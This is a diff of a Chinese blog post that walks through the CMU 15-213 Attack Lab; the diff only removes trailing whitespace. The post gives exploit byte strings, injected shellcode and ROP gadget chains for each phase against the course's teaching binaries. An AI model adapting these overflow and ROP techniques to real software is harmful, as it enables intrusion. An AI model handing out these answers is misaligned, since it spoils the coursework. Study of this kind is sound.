@@ -25,7 +25,7 @@ PASS: Would have posted the following:
 	user <span class="nb">id	</span>bovik
 	course	15213-f15
 	lab	attacklab
-	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
 
 </code></pre></div></div> <h2 id="phase-2">Phase 2</h2> <p>第二个阶段要求带参数进入<code class="language-plaintext highlighter-rouge">touch2</code>函数，<code class="language-plaintext highlighter-rouge">%rdi</code>作为第一个参数传递。</p> <p>问题在于，现在我们可以利用缓冲区溢出，修改上一个栈帧的栈顶，也就是ret指令的返回值。</p> <p>但是如何执行参数赋值呢？</p> <p>正常来说带参数调用函数，应该是先对参数赋值，然后进入函数。</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span> <span class="kc">$</span><span class="nv">cookie</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
 <span class="nf">call</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">&gt;</span>
@@ -33,7 +33,7 @@ PASS: Would have posted the following:
 00 00 00 00 00 00 00 00     # 那么这里的地址是0xabcde8
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧  
+00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
 e0 cd ab 00 00 00 00 00     # 这里篡改了ret的返回函数地址 &lt;- %rsp + 0x28
 </code></pre></div></div> <p>需要注意的是，执行完了movl给第一个参数赋值cookie，我们要跳转到<code class="language-plaintext highlighter-rouge">touch2</code>: 0x4017ec的位置</p> <p>writeup中说明了，最好不要使用call或者jmp指令，所以我们仍然使用ret指令。</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>内部的ret指令执行完毕后，PC指向攻击代码的部分，同时，%rsp指向原本栈帧<code class="language-plaintext highlighter-rouge">test</code>函数的部分</p> <p>为了跳转<code class="language-plaintext highlighter-rouge">touch2</code>，我们要push一次<code class="language-plaintext highlighter-rouge">touch2</code>的地址。</p> <p>所以初步的攻击代码如下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span>    <span class="kc">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
 <span class="nf">pushq</span>   <span class="kc">$</span><span class="mh">0x4017ec</span>
@@ -50,7 +50,7 @@ Disassembly of section .text:
 0000000000000000 &lt;.text&gt;:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 </code></pre></div></div> <p>同时，需要知道当程序运行到<code class="language-plaintext highlighter-rouge">getbuf</code>时，<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值，因为我们需要绕回到这个地址然后逐行执行攻击代码。</p> <p>在<code class="language-plaintext highlighter-rouge">getbuf</code>第二行汇编处断点，用gdb调试打印<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值即可。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> i r rsp
 0x5561dc78
 </code></pre></div></div> <p>所以level2的注入代码如下:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bf fa 97 b9 59 68 ec 17
@@ -68,7 +68,7 @@ xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx # &lt;- %rsp的位置 同时也是缓冲区输入的位置
-</code></pre></div></div> <p>按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉<code class="language-plaintext highlighter-rouge">ret address</code>的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。</p> <p>但是writeup中提及，当<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>调用的时候，会push数据到栈中。</p> <p>下面是<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕后栈的情况:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 &lt;- %rsp的位置 
+</code></pre></div></div> <p>按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉<code class="language-plaintext highlighter-rouge">ret address</code>的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。</p> <p>但是writeup中提及，当<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>调用的时候，会push数据到栈中。</p> <p>下面是<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕后栈的情况:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 &lt;- %rsp的位置
 [ret address (64bit)]   # 因为ret将%rip的位置设置到了这一行的地址
 xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
 xx xx xx xx xx xx xx xx #
@@ -87,7 +87,7 @@ xx xx xx xx xx xx xx xx # &lt;- %rip 即将要执行的攻击代码
 <span class="err">0000000000000000</span> <span class="o">&lt;</span><span class="nf">.text</span><span class="o">&gt;</span><span class="p">:</span>
    <span class="err">0</span><span class="p">:</span>	<span class="err">48</span> <span class="nf">c7</span> <span class="nv">c7</span> <span class="nv">a8</span> <span class="nv">dc</span> <span class="mi">61</span> <span class="mi">55</span> 	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>
    <span class="err">7</span><span class="p">:</span>	<span class="err">68</span> <span class="nf">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">pushq</span>  <span class="kc">$</span><span class="mh">0x4018fa</span>
-   <span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+   <span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
 
 </code></pre></div></div> <p>所以答案<code class="language-plaintext highlighter-rouge">phase3.txt</code>是:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 c7 c7 a8 dc 61 55 68 # 攻击代码从这里开始 %rip是逐行执行
 fa 18 40 00 c3 00 00 00
@@ -106,7 +106,7 @@ Disassembly of section .text:
 0000000000000000 &lt;.text&gt;:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 </code></pre></div></div> <p>然后我们能够控制的就是缓冲区的输入，替换掉ret的地址，然后一直链式反应，执行我们的代码.</p> <p>比如<code class="language-plaintext highlighter-rouge">ret</code>的字节码是<code class="language-plaintext highlighter-rouge">c3</code>, <code class="language-plaintext highlighter-rouge">nop</code>的字节码是<code class="language-plaintext highlighter-rouge">90</code></p> <p>那么我们需要有这样的栈结构（尽管会破坏test函数栈）:</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕，<code class="language-plaintext highlighter-rouge">%rsp</code>加上<code class="language-plaintext highlighter-rouge">0x28</code>然后指向下面的<code class="language-plaintext highlighter-rouge">address</code></p> <p>然后进行<code class="language-plaintext highlighter-rouge">ret</code>指令</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x8: [gadget 2的地址]
 address:       [gadget 1的地址]  # &lt;- %rsp 即将ret跳转到gadget1
 --------上面是栈的结构----------
@@ -132,7 +132,7 @@ fa 97 b9 59 00 00 00 00
 ec 17 40 00 00 00 00 00
 </code></pre></div></div> <p>精彩，不过为什么没用到<code class="language-plaintext highlighter-rouge">farm</code>的代码段呢，<em>无所谓了</em>。</p> <p>只要达到了攻击效果就行。</p> <p>（然而我仔细阅读了writeup之后发现，我们需要的字节码都能够在<code class="language-plaintext highlighter-rouge">start_farm</code>到<code class="language-plaintext highlighter-rouge">mid_farm</code>中找到, 其实就是pop到<code class="language-plaintext highlighter-rouge">%rax</code>中，然后再赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>而已，只不过正好被我在别的程序段找到了更简洁的解法。）</p> <h2 id="phase-5">Phase 5</h2> <p>Phase5要求和Phase3一样，调用<code class="language-plaintext highlighter-rouge">touch3</code>并且传入字符串<code class="language-plaintext highlighter-rouge">cookie</code></p> <p>与Phase3不同的是，<code class="language-plaintext highlighter-rouge">rtarget</code>采用了栈随机化，导致我们的字符串若是存在栈中，我们需要解决栈的地址的问题。</p> <p>那么总体还是一样的，就是调用<code class="language-plaintext highlighter-rouge">touch3</code>之前，保证<code class="language-plaintext highlighter-rouge">%rdi</code>的值是字符串的地址。</p> <p>此外，还要将</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>35 39 62 39 39 37 66 61 # cookie的ASCII表示
 </code></pre></div></div> <p>存在那个地址。</p> <p>然后将<code class="language-plaintext highlighter-rouge">touch3</code>的地址压入栈中，<code class="language-plaintext highlighter-rouge">ret</code>指令进入<code class="language-plaintext highlighter-rouge">touch3</code>:<code class="language-plaintext highlighter-rouge">0x4018fa</code></p> <p>但是，<code class="language-plaintext highlighter-rouge">rtarget</code>中，我相信一定不会有这样的内存区域正好存着cookie的ASCII，所以这一串仍然需要我们通过缓冲区溢出的漏洞，写入栈帧中。</p> <p>那么问题就在于，如何在栈随机化的程序上，明确<code class="language-plaintext highlighter-rouge">%rsp</code>的值呢？</p> <p>或者，我们只需要<code class="language-plaintext highlighter-rouge">%rsp</code>的值赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>，然后对<code class="language-plaintext highlighter-rouge">%rdi</code>进行一些加减操作，偏移到我们存储的地方即可。</p> <p>并且注意到<code class="language-plaintext highlighter-rouge">farm.c</code>中正好就有定义<code class="language-plaintext highlighter-rouge">add_xy(long x, long y)</code>:并且在<code class="language-plaintext highlighter-rouge">rtarget.asm</code>中的<code class="language-plaintext highlighter-rouge">0x4019d6</code></p> <p>那么显然我们有这样的栈结构和操作:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x28:[cookie的ASCII]  # &lt;- %rdi + 0x20
-address + 0x20: [touch3的地址]    
+address + 0x20: [touch3的地址]
 address + 0x18: [add_xy()的地址]
 address + 0x10: [第二个参数:0x20]
 address + 0x8: [gadget 3的地址]  # mov %rsp, %rdi之前，%rsp是在这
@@ -159,7 +159,7 @@ c3       # ret
   <span class="err">401</span><span class="nl">aab:</span> <span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">90</span>            	<span class="nv">movl</span>	<span class="kc">$</span><span class="mh">0x90e08948</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">imm</span> <span class="err">=</span> <span class="mh">0x90E08948</span>
   <span class="err">401</span><span class="nl">ab1:</span> <span class="nf">c3</span>                           	<span class="nv">retq</span>
 </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">48 89 e0</code>正好是<code class="language-plaintext highlighter-rouge">mov %rsp, %rax</code>是可以接受的，并且<code class="language-plaintext highlighter-rouge">90</code>是nop.</p> <p>那么还差一个<code class="language-plaintext highlighter-rouge">mov %rax, %rdi</code>是重复的。</p> <p>所以:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x38: [cookie的ASCII]  # &lt;- %rdi + 0x30
-address + 0x30: [touch3的地址]     
+address + 0x30: [touch3的地址]
 address + 0x28: [gadget 6的地址]
 address + 0x20: [add_xy()的地址]
 address + 0x18: [第二个参数:0x28]
@@ -181,7 +181,7 @@ gadget 5: ret                   # 然后ret进入add_xy:0x4019d6
 *gadget 6: mov %rax, %rdi        # 加法结果保存为第一个参数
 *gadget 7: ret                   # 这是add_xy内部的ret
 </code></pre></div></div> <p>那么<code class="language-plaintext highlighter-rouge">gadgets</code>的字节码及其地址有:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 89 e0 # mov %rsp, %rax -&gt; 0x401a06
-c3       # ret            
+c3       # ret
 48 89 c7 # mov %rax, %rdi -&gt; 0x4019a2
 c3       # ret
 5e       # popq %rsi      -&gt; 0x401383
